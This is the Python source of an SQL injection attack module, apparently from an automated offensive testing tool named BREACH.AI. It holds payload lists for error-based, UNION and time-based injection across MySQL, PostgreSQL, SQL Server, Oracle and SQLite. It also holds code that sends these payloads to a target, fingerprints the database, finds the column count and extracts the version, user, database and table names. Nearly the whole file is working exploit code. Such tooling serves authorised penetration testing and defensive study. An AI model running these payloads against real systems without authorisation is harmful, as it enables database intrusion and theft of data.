"""
BREACH.AI - SQL Injection Attack Module

Comprehensive SQL injection testing including:
- Error-based SQLi
- Union-based SQLi
- Blind SQLi (boolean and time-based)
- Out-of-band SQLi
"""

import asyncio
import re
import time
from typing import Optional

from backend.breach.attacks.base import AttackResult, InjectionAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.http import HTTPClient, HTTPResponse
from backend.breach.utils.logger import logger


class SQLInjectionAttack(InjectionAttack):
    """
    SQL Injection attack module.

    Tests for various SQL injection vulnerabilities and attempts
    to extract data when found.
    """

    name = "SQL Injection"
    attack_type = "sqli"
    description = "Tests for SQL injection vulnerabilities"
    severity = Severity.CRITICAL
    owasp_category = "A03:2021 Injection"
    cwe_id = 89

    # Error patterns indicating SQL injection
    error_patterns = [
        # MySQL
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark",
        "mysql_fetch",
        "mysql_num_rows",
        "mysql_query",

        # PostgreSQL
        "postgresql",
        "pg_query",
        "pg_exec",
        "unterminated quoted string",

        # SQL Server
        "microsoft ole db provider for sql server",
        "unclosed quotation mark after the character string",
        "incorrect syntax near",
        "mssql_query",

        # Oracle
        "ora-01756",
        "ora-00933",
        "oracle error",
        "quoted string not properly terminated",

        # SQLite
        "sqlite_query",
        "sqlite3::query",
        "sqlite error",

        # Generic
        "sql syntax",
        "syntax error",
        "odbc drivers",
        "sql error",
        "database error",
        "query failed",
    ]

    # Payloads for different SQL injection techniques
    ERROR_PAYLOADS = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "') OR ('1'='1",
        "' AND '1'='1",
        "1 AND 1=1",
        "1 OR 1=1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "admin'--",
        "' OR ''='",
        "1' AND '1'='1' /*",
        "1'1",
        "1 EXEC XP_",
    ]

    TIME_PAYLOADS = [
        # MySQL
        "' OR SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "' OR SLEEP(5)#",
        "'; WAITFOR DELAY '0:0:5'--",  # SQL Server
        "' || pg_sleep(5)--",  # PostgreSQL
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",  # Oracle
    ]

    UNION_PAYLOADS = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "0 UNION SELECT NULL--",
        "-1 UNION SELECT NULL--",
    ]

    # Data extraction payloads (when we know columns)
    EXTRACT_PAYLOADS = {
        "mysql": {
            "version": "' UNION SELECT @@version--",
            "user": "' UNION SELECT user()--",
            "database": "' UNION SELECT database()--",
            "tables": "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        },
        "postgresql": {
            "version": "' UNION SELECT version()--",
            "user": "' UNION SELECT current_user--",
            "database": "' UNION SELECT current_database()--",
        },
        "mssql": {
            "version": "' UNION SELECT @@version--",
            "user": "' UNION SELECT SYSTEM_USER--",
            "database": "' UNION SELECT DB_NAME()--",
        }
    }

    def get_payloads(self) -> list[str]:
        """Get all SQL injection payloads."""
        return self.ERROR_PAYLOADS + self.TIME_PAYLOADS[:3] + self.UNION_PAYLOADS[:3]

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Quick check for SQL injection vulnerability."""
        if not parameter:
            return False

        # Try basic error-based detection
        for payload in self.ERROR_PAYLOADS[:5]:
            response = await self._send_payload(url, parameter, payload, method)

            if self._detect_error_patterns(response.body, self.error_patterns):
                logger.debug(f"SQLi indicator found with payload: {payload}")
                return True

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Full SQL injection exploitation."""
        if not parameter:
            return self._create_result(False, url, parameter)

        result = self._create_result(False, url, parameter)

        # Step 1: Confirm vulnerability with error-based test
        vuln_payload = await self._find_working_payload(url, parameter, method)
        if not vuln_payload:
            return result

        result.success = True
        result.payload = vuln_payload
        result.details = "SQL Injection confirmed"

        # Step 2: Determine database type
        db_type = await self._detect_database_type(url, parameter, method)
        result.context["db_type"] = db_type
        result.details += f" (Database: {db_type})"

        # Step 3: Try to determine number of columns (for UNION attacks)
        columns = await self._find_column_count(url, parameter, method)
        if columns:
            result.context["columns"] = columns
            result.details += f", {columns} columns"

        # Step 4: Attempt data extraction
        extracted = await self._extract_data(url, parameter, method, db_type, columns)
        if extracted:
            result.data_sample = str(extracted)
            result.access_gained = AccessLevel.DATABASE
            result.add_evidence(
                "data_extraction",
                f"Extracted data from {db_type} database",
                extracted
            )

        # Step 5: Try time-based if nothing else worked
        if not result.data_sample:
            is_time_based = await self._check_time_based(url, parameter, method)
            if is_time_based:
                result.details += " (Time-based blind SQLi confirmed)"
                result.context["technique"] = "time_based"

        return result

    async def _find_working_payload(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> Optional[str]:
        """Find a payload that triggers SQL error."""
        for payload in self.ERROR_PAYLOADS:
            response = await self._send_payload(url, parameter, payload, method)

            if self._detect_error_patterns(response.body, self.error_patterns):
                return payload

        return None

    async def _detect_database_type(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> str:
        """Detect the type of database."""
        # Check error messages for hints
        response = await self._send_payload(url, parameter, "'", method)
        body = response.body.lower()

        if any(x in body for x in ["mysql", "mariadb"]):
            return "mysql"
        elif any(x in body for x in ["postgresql", "pg_"]):
            return "postgresql"
        elif any(x in body for x in ["microsoft", "mssql", "sqlserver"]):
            return "mssql"
        elif any(x in body for x in ["oracle", "ora-"]):
            return "oracle"
        elif any(x in body for x in ["sqlite"]):
            return "sqlite"

        # Try version functions
        version_tests = [
            ("' UNION SELECT @@version--", "mysql"),
            ("' UNION SELECT version()--", "postgresql"),
        ]

        for payload, db_type in version_tests:
            response = await self._send_payload(url, parameter, payload, method)
            if response.status_code == 200 and len(response.body) > 0:
                if not self._detect_error_patterns(response.body, ["error", "syntax"]):
                    return db_type

        return "unknown"

    async def _find_column_count(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> Optional[int]:
        """Find the number of columns for UNION attack."""
        # Use ORDER BY technique
        for i in range(1, 20):
            payload = f"' ORDER BY {i}--"
            response = await self._send_payload(url, parameter, payload, method)

            if self._detect_error_patterns(response.body, ["order", "column", "unknown"]):
                return i - 1

        # Try UNION NULL technique
        for i in range(1, 10):
            nulls = ",".join(["NULL"] * i)
            payload = f"' UNION SELECT {nulls}--"
            response = await self._send_payload(url, parameter, payload, method)

            if not self._detect_error_patterns(response.body, ["column", "error"]):
                return i

        return None

    async def _extract_data(
        self,
        url: str,
        parameter: str,
        method: str,
        db_type: str,
        columns: Optional[int]
    ) -> Optional[dict]:
        """Attempt to extract data from the database."""
        extracted = {}

        if db_type not in self.EXTRACT_PAYLOADS:
            return None

        payloads = self.EXTRACT_PAYLOADS[db_type]

        # Adjust payloads for column count
        if columns and columns > 1:
            nulls_before = ",".join(["NULL"] * (columns - 1))
            adjusted_payloads = {
                key: payload.replace("UNION SELECT ", f"UNION SELECT {nulls_before},")
                for key, payload in payloads.items()
            }
        else:
            adjusted_payloads = payloads

        for data_type, payload in adjusted_payloads.items():
            try:
                response = await self._send_payload(url, parameter, payload, method)

                if response.is_success:
                    # Try to extract the injected data
                    data = self._extract_injected_data(response.body)
                    if data:
                        extracted[data_type] = data

            except Exception as e:
                logger.debug(f"Data extraction failed for {data_type}: {e}")

        return extracted if extracted else None

    def _extract_injected_data(self, body: str) -> Optional[str]:
        """Extract injected data from response body."""
        # Look for common patterns in extracted data

        # Version strings
        version_patterns = [
            r'(\d+\.\d+\.\d+[-\w]*)',  # Version numbers
            r'(MySQL|PostgreSQL|Microsoft SQL Server|Oracle)[\s\S]{0,50}',
        ]

        for pattern in version_patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                return match.group(0)[:200]

        return None

    async def _check_time_based(
        self,
        url: str,
        parameter: str,
        method: str
    ) -> bool:
        """Check for time-based blind SQL injection."""
        # Get baseline response time
        start = time.monotonic()
        await self._send_payload(url, parameter, "test", method)
        baseline = time.monotonic() - start

        # Try time-based payloads
        for payload in self.TIME_PAYLOADS:
            start = time.monotonic()
            await self._send_payload(url, parameter, payload, method)
            elapsed = time.monotonic() - start

            # If response took significantly longer, might be vulnerable
            if elapsed > baseline + 4:  # At least 4 seconds more
                logger.debug(f"Time-based SQLi detected: {elapsed:.2f}s vs {baseline:.2f}s baseline")
                return True

        return False
